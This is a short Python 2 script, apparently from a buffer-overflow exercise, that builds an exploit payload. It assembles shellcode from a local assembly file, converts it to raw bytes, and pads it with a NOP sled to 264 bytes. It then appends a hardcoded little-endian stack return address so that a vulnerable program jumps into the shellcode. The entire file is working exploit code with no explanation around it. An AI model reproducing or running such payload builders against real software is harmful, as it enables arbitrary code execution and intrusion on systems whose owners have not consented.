import subprocess

# get shellcode
cmd = """echo $(gcc -c shellcode.s && for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\\x'$i; done;)"""
shellcode = subprocess.check_output(['bash','-c', cmd])
shellcode = shellcode[:-1] # remove trailing newline

# annoying string conversion
l_shellcode = len(shellcode)
string_byte_size = 4 # backslash, x, two digits,
converted_shellcode_bytes = []
for idx in xrange(0, l_shellcode, string_byte_size):
    num = shellcode[idx + 2] + shellcode[idx + 3]
    hex_num = num.decode('hex')
    converted_shellcode_bytes.append(hex_num)

shellcode = ''.join(converted_shellcode_bytes)

assert '\x00' not in shellcode

nop_sled = "\x90" * (264 - len(shellcode))
payload = nop_sled + shellcode

# add return address
return_addr_big_endian = "\x7f\xff\xff\xff\xdc\x96"
return_addr_little_endian = return_addr_big_endian[::-1]
# we can leave off the two leading zeroes since they are now at the end
# so we won't overwrite the ones that are there
payload += return_addr_little_endian

print(payload)

